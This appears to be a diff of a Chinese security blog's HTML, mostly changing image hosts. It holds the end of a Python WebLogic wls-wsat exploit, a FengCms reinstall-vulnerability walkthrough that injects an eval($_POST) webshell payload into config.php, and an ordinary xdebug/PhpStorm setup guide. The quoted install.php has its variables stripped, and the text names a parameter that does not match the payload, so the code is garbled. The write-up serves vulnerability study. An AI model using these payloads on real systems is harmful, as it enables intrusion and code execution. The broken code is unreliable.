&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line"></span><br><span class="line">    respond = requests.post(url=url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span>(respond.status_code == <span class="number">500</span>):</span><br><span class="line">        print(<span class="string">'success'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.1.101:7001/wls-wsat/CoordinatorPortType"</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure>
 
@@ -1884,7 +1970,7 @@
 <p>我们再来看看<code>Install/install.php</code>文件，代码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// = fopen(, "w");   //以写入的方式打开config.php这个文件。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'install'</span>])&#123;  <span class="comment">//获取用户提交的数据。  </span></span><br><span class="line">=[<span class="string">'host'</span>];  </span><br><span class="line">=[<span class="string">'user'</span>];  </span><br><span class="line">=[<span class="string">'password'</span>];  </span><br><span class="line">=[<span class="string">'dbname'</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!=@mysql_connect(,,))&#123;  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"连接数据库失败！请返回上一页检查连接参数 返回修改"</span>;  </span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  mysql_query(<span class="string">"set names gb2312"</span>);  <span class="comment">//设置数据库的编码，注意要与前面一致。  </span></span><br><span class="line">   <span class="keyword">if</span>(!mysql_select_db(,))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。  </span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(!mysql_query())&#123;  </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"创建数据库失败，请确认是否有足够的权限！返回修改"</span>;  </span><br><span class="line">           <span class="keyword">exit</span>();  </span><br><span class="line">          &#125;  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">     = fopen(, <span class="string">"w"</span>);   <span class="comment">//以写入的方式打开config.php这个文件。  </span></span><br><span class="line">    fwrite(,);  <span class="comment">//将配置信息写入config.php文件。  </span></span><br><span class="line">    fclose();  </span><br><span class="line">    <span class="keyword">include_once</span>(ABS_PATH.<span class="string">"config.php"</span>);   <span class="comment">//导入配置信息.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。  </span></span><br><span class="line">   <span class="comment">//新建一个表test1  </span></span><br><span class="line">   [] = <span class="string">"CREATE TABLE `test1` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">    <span class="comment">//新建一个表test2  </span></span><br><span class="line">    [] = <span class="string">"CREATE TABLE `test2` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">     <span class="comment">//为test1表默认初始化一些数据。  </span></span><br><span class="line">     []=<span class="string">"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')"</span>;  </span><br><span class="line">     <span class="keyword">foreach</span>( <span class="keyword">as</span> )&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!mysql_query())&#123;      <span class="comment">//依次执行以上的sql语句，就是创建表和初始化数据。  </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"创建表失败或者初始化数据失败"</span>;  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">     mysql_close();  </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"安装成功"</span>;<span class="comment">//可以做一个跳转到首页。  </span></span><br><span class="line">     <span class="keyword">exit</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件：</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
 <p>我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
 <p>这样我们就可以通过参数<code>a</code> ，去执行任意的代码。</p>
@@ -1892,11 +1978,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/install/index.php</span><br></pre></td></tr></table></figure>
 <p>上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
 <p>当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。</p>
 <p>接下来访问<code>127.0.0.1</code> ，使用Post方式提交数据<code>a=phpinfo();</code> </p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
 <p>。。。</p>
 <p>成功利用了FengCms重装漏洞。</p>
 <p><strong>修复建议</strong></p>
@@ -1991,77 +2077,77 @@
 </li>
 </ul>
 <h2 id="0x01-PHP-环境安装"><a href="#0x01-PHP-环境安装" class="headerlink" title="0x01 PHP 环境安装"></a>0x01 PHP 环境安装</h2><p>1、选择解压目录为 C:\phpStudy。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/87ieiL8g3j.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/87ieiL8g3j.png?imageslim" alt="mark"></p>
 <p>2、如图所示，phpStudy的目录结构。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/KimDb880Im.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/KimDb880Im.png?imageslim" alt="mark"></p>
 <p>3 、如果需要Visual C++ 运行库（Visual C++ Redistributable），可到微软官网下载。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/BAmHJidLah.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/BAmHJidLah.png?imageslim" alt="mark"></p>
 <p>下载Visual C++ Redistributable for Visual Studio 2015。选择操作系统对应的位数。</p>
 <p><a href="http://www.microsoft.com/zh-cn/download/details.aspx?id=48145" target="_blank" rel="noopener">http://www.microsoft.com/zh-cn/download/details.aspx?id=48145</a></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/mH77gccdDd.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/mH77gccdDd.png?imageslim" alt="mark"></p>
 <p>进行安装。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/4fGIA49a47.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/4fGIA49a47.png?imageslim" alt="mark"></p>
 <p>4、点击启动按钮可以看到phpStudy 已经成功启动。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/3iJLCDmADg.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/3iJLCDmADg.png?imageslim" alt="mark"></p>
 <p>5、点击MySQL管理器，我们常用MySQL-Front管理Mysql数据库。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/EeDdE38jaF.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/EeDdE38jaF.png?imageslim" alt="mark"></p>
 <p>6、 可以根据需要切换PHP对应版本。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/eK75kaedJA.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/eK75kaedJA.png?imageslim" alt="mark"></p>
 <p>7、在 “其他选项管理器”，可以看到常见的一些使用的工具与常见的快捷按钮。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/H4jahfLcFH.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/H4jahfLcFH.png?imageslim" alt="mark"></p>
 <p>8、 点击“ My HomePage”</p>
 <p>在浏览器中可看到，环境正常。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/FFeKjJBb2k.png?imageslim" alt="mark">9、点击程序后可以，phpStudy 后台运行服务。可在屏幕右下角找到。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/aD9Cj8l3Ah.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/FFeKjJBb2k.png?imageslim" alt="mark">9、点击程序后可以，phpStudy 后台运行服务。可在屏幕右下角找到。</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/aD9Cj8l3Ah.png?imageslim" alt="mark"></p>
 <p>10、 成功安装phpStudy集成环境，下面安装配置PHP代码调试环境。</p>
 <h2 id="0x02-通用工具安装配置"><a href="#0x02-通用工具安装配置" class="headerlink" title="0x02 通用工具安装配置"></a>0x02 通用工具安装配置</h2><h3 id="1、安装配置PhpStorm"><a href="#1、安装配置PhpStorm" class="headerlink" title="1、安装配置PhpStorm"></a>1、安装配置<a href="http://www.jetbrains.com/phpstorm/" target="_blank" rel="noopener">PhpStorm</a></h3><p>下载好phpstorm安装程序打开，根据提示，下一步即可安装。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/AcFCcD9Abf.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/AcFCcD9Abf.png?imageslim" alt="mark"></p>
 <p>可以看到我们可以选择使用32位与64位版本的phpstorm。在这里要勾选下载JRE，可以自动下载安装JRE程序，点击下一步。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/g08JG1ceFB.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/g08JG1ceFB.png?imageslim" alt="mark"></p>
 <p>安装完成启动。</p>
 <p>可以选择激活和30试用,在这里我们选择30天试用。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/3lDgaJIFk7.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/3lDgaJIFk7.png?imageslim" alt="mark"></p>
 <p>点击“Accept”</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/HD09BAJDmG.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/HD09BAJDmG.png?imageslim" alt="mark"></p>
 <p>可以看到PhpStorm正常启动。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/5IiBL2abBa.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/j53hcCmf3C.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/5IiBL2abBa.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/j53hcCmf3C.png?imageslim" alt="mark"></p>
 <h3 id="2、安装配置-Sublime-text"><a href="#2、安装配置-Sublime-text" class="headerlink" title="2、安装配置 Sublime text"></a>2、安装配置 <a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a></h3><p>安装 <a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a> ,一路next即可。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/kLgJk1EGE4.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/kLgJk1EGE4.png?imageslim" alt="mark"></p>
 <p>这里需要Python环境。安装Python3.6</p>
 <p><a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener">https://www.python.org/downloads/windows/</a></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/b4I82F0ihk.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/b4I82F0ihk.png?imageslim" alt="mark"></p>
 <p>安装 Python3.6，勾选添加Python环境变量，点击”Install Now “。即开始安装。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/6hgDDKGhm3.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/6hgDDKGhm3.png?imageslim" alt="mark"></p>
 <p>可以看到成功安装Python环境。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/I2fme05i82.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/6LdEga51aB.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/I2fme05i82.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/6LdEga51aB.png?imageslim" alt="mark"></p>
 <p>在<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text </a>Package Control组件在线安装</p>
 <ul>
 <li>按Ctrl+`调出console（注：避免热键冲突）</li>
 <li>粘贴以下代码到命令行并回车：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), <span class="string">'wb'</span>).write(urllib.request.urlopen( <span class="string">'http://sublime.wbond.net/'</span> + pf.replace(<span class="string">' '</span>,<span class="string">'%20'</span>)).read())</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/h6DKHIBckE.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/h6DKHIBckE.png?imageslim" alt="mark"></p>
 <p>​    重启Sublime Text 3。</p>
 <p>​    如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/Kc0cDck83e.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/Kc0cDck83e.png?imageslim" alt="mark"></p>
 <p>接下来可以安装一些插件。</p>
 <h3 id="3、安装Postman"><a href="#3、安装Postman" class="headerlink" title="3、安装Postman"></a>3、安装Postman</h3><p>下一步下一步即可，没什么可注意的的地方。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/74lh0558Ld.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/74lh0558Ld.png?imageslim" alt="mark"></p>
 <h2 id="0x03-本地代码调试环境搭建"><a href="#0x03-本地代码调试环境搭建" class="headerlink" title="0x03  本地代码调试环境搭建"></a>0x03  本地代码调试环境搭建</h2><h3 id="1、安装-xdebug"><a href="#1、安装-xdebug" class="headerlink" title="1、安装  xdebug"></a>1、安装  <a href="https://xdebug.org/" target="_blank" rel="noopener">xdebug</a></h3><p>xdebug 网站：<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a></p>
 <h4 id="（1）下载对应操作系统和PHP版本的xdebug-库文件"><a href="#（1）下载对应操作系统和PHP版本的xdebug-库文件" class="headerlink" title="（1）下载对应操作系统和PHP版本的xdebug 库文件"></a>（1）下载对应操作系统和PHP版本的xdebug 库文件</h4><p><strong>需要特别注意的是需要下载对应操作系统和PHP版本的xdebug 库文件</strong>。phpStudy在查看phpinfo，可知php的各种参数。</p>
 <p><img src="C:\Users\shackle\AppData\Local\Temp\1533271285872.png" alt="1533271285872"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/H8kJi2bhii.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/H8kJi2bhii.png?imageslim" alt="mark"></p>
 <p>在官网上提供了一个推荐下载的方式。复制phpinfo 内容到以下这个网站粘贴上去。就可以得到链接下载。<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a>   <strong>目前这种方法只支持PHP大于7的版本。</strong></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/aHjGm98JLm.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/aHjGm98JLm.png?imageslim" alt="mark"></p>
 <p>如下图所示，可以看到下载链接。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/eaEmJB5a5C.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/eaEmJB5a5C.png?imageslim" alt="mark"></p>
 <p>我们再刷新一下phpinfo。 可以看到，搜索xdebug成功安装上去。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180803/hH31cbgfaj.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180803/hH31cbgfaj.png?imageslim" alt="mark"></p>
 <p>如果 PHP 版本小于7那么就要到<a href="https://xdebug.org/download.php，手动下载需要的版本文件。" target="_blank" rel="noopener">https://xdebug.org/download.php，手动下载需要的版本文件。</a></p>
 <h4 id="（2）编辑php-ini"><a href="#（2）编辑php-ini" class="headerlink" title="（2）编辑php-ini"></a>（2）编辑php-ini</h4><p>可通过快捷方式打开，也可以进去其目录编辑php.ini文件。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/aEF5D5AG1I.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/aEF5D5AG1I.png?imageslim" alt="mark"></p>
 <p>在php.ini文件最后面加上xdebug配置内容。 需要根据自己的环境修改</p>
 <ul>
 <li>zend_extension设置自己环境的xdebug.dll文件绝对路径。</li>
@@ -2070,51 +2156,51 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[xdebug]</span><br><span class="line">；xdebug.dll文件路径</span><br><span class="line">zend_extension =&quot;C:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug-2.5.5-5.6-vc11-nts.dll&quot;</span><br><span class="line"></span><br><span class="line">;运行远程调试</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port=9001</span><br><span class="line">xdebug.remote_host=&quot;localhost&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey= &quot;360college&quot;</span><br></pre></td></tr></table></figure>
 <h3 id="2、-PHPstorm配置"><a href="#2、-PHPstorm配置" class="headerlink" title="2、 PHPstorm配置"></a>2、 PHPstorm配置</h3><h4 id="（1）打开文件"><a href="#（1）打开文件" class="headerlink" title="（1）打开文件"></a>（1）打开文件</h4><p>点击open，打开需要调试的PHP文件。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/834hK3bEGA.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/834hK3bEGA.png?imageslim" alt="mark"></p>
 <p>选择php文件目录。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/7f9imFEDm7.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/7f9imFEDm7.png?imageslim" alt="mark"></p>
 <h4 id="（2）设置PHP环境"><a href="#（2）设置PHP环境" class="headerlink" title="（2）设置PHP环境"></a>（2）设置PHP环境</h4><p>在File中打开Settings，配置设置。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/412i5FjcFm.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/412i5FjcFm.png?imageslim" alt="mark"></p>
 <p>在设置界面中的PHP选项中添加PHP环境，即为我们之前设置的网站运行的PHP环境。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/aIIL4l0JfF.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/aIIL4l0JfF.png?imageslim" alt="mark"></p>
 <p>编辑所需要的选项。</p>
 <p><img src="C:\Users\shackle\AppData\Local\Temp\1533364142489.png" alt="1533364142489"></p>
 <h4 id="（3）配置Debug"><a href="#（3）配置Debug" class="headerlink" title="（3）配置Debug"></a>（3）配置Debug</h4><p>在file-&gt;settings-&gt;Languages &amp; Frameworks-&gt;PHP ，选择Debug，设置监听的端口，要和之配置的端口一样。这里配置的是9001。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
 <p>还要设置DBGp Proxy 如下：端口同样为9001，key为之前设置的360college。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/7LlC4geibh.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/7LlC4geibh.png?imageslim" alt="mark"></p>
 <h4 id="（4）配置-Server"><a href="#（4）配置-Server" class="headerlink" title="（4）配置 Server"></a>（4）配置 Server</h4><p>在File-&gt;settings-&gt;Languages Frameworks-&gt;PHP 中设置Server。新建Server，设置Name为需要名字，Host设置为localhost，端口等根据环境设置。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/8Ij1G0HLal.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/8Ij1G0HLal.png?imageslim" alt="mark"></p>
 <h4 id="（5）配置调试选项"><a href="#（5）配置调试选项" class="headerlink" title="（5）配置调试选项"></a>（5）配置调试选项</h4><p>在Run/Debug Configurations中新建PHP web Page。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/HF2EFdKB7J.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/HF2EFdKB7J.png?imageslim" alt="mark"></p>
 <p>设置Name，选择server 为之前设置的server，根据环境设置Start URL结构。</p>
 <p>点击箭头所示Validate验证配置是否正确。如下为正确。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/lDblk9g17f.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/lDblk9g17f.png?imageslim" alt="mark"></p>
 <h4 id="（6）开始调试"><a href="#（6）开始调试" class="headerlink" title="（6）开始调试"></a>（6）开始调试</h4><p>​    在index.php文件中点击，打上断点。点击像小虫子一样的图标开始调试。可以看到弹出浏览器界面，调试开始。界面下方看到，调试参数。接下来可以进行代码走查，单步多部执行。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/KlJl260a2d.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/KlJl260a2d.png?imageslim" alt="mark"></p>
 <p>执行调试，看到变量变化情况。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/2KLJ8kG1lm.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/2KLJ8kG1lm.png?imageslim" alt="mark"></p>
 <h3 id="3、-浏览器插件"><a href="#3、-浏览器插件" class="headerlink" title="3、 浏览器插件"></a>3、 浏览器插件</h3><p><a href="https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions" target="_blank" rel="noopener">https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions</a></p>
 <p><a href="https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/</a></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180805/2f1kGE510a.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180805/2f1kGE510a.png?imageslim" alt="mark"></p>
 <p>编码设置：</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180805/29f0B8Fkdc.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180805/29f0B8Fkdc.png?imageslim" alt="mark"></p>
 <h2 id="0x04-远程代码调试环境搭建"><a href="#0x04-远程代码调试环境搭建" class="headerlink" title="0x04  远程代码调试环境搭建"></a>0x04  远程代码调试环境搭建</h2><h4 id="1、-PHP中配置xdebug"><a href="#1、-PHP中配置xdebug" class="headerlink" title="1、 PHP中配置xdebug"></a>1、 PHP中配置xdebug</h4><p>下载xdebug文件。</p>
 <p>PHP.ini 文件根据环境添加以下内容。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension =&quot;D:\phpStudy2018\PHPTutorial\php\php-5.4.45-nts\ext\php_xdebug-2.4.1-5.4-vc9-nts-x86_64.dll&quot;</span><br><span class="line"></span><br><span class="line">;运行远程调试</span><br><span 